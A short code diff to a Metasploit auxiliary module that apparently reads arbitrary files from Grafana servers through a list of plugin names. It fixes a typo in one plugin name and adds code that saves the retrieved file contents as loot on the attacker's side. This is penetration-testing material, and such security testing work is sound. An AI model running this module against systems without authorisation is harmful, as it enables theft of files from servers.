@@ -75,7 +75,7 @@ class MetasploitModule < Msf::Auxiliary
       'stackdriver',
       'stat',
       'state-timeline',
-      'status-histor',
+      'status-history',
       'table',
       'table-old',
       'tempo',
@@ -93,7 +93,14 @@ class MetasploitModule < Msf::Auxiliary
       next unless res && res.code == 200
 
       print_good(res.body)
-      # store loot
+      path = store_loot(
+        'grafana.loot',
+        'application/octet-stream',
+        ip,
+        res.body,
+        File.basename(datastore['FILEPATH'])
+      )
+      print_good("#{rhost}:#{rport} - File saved in: #{path}")
       break
     end
   end
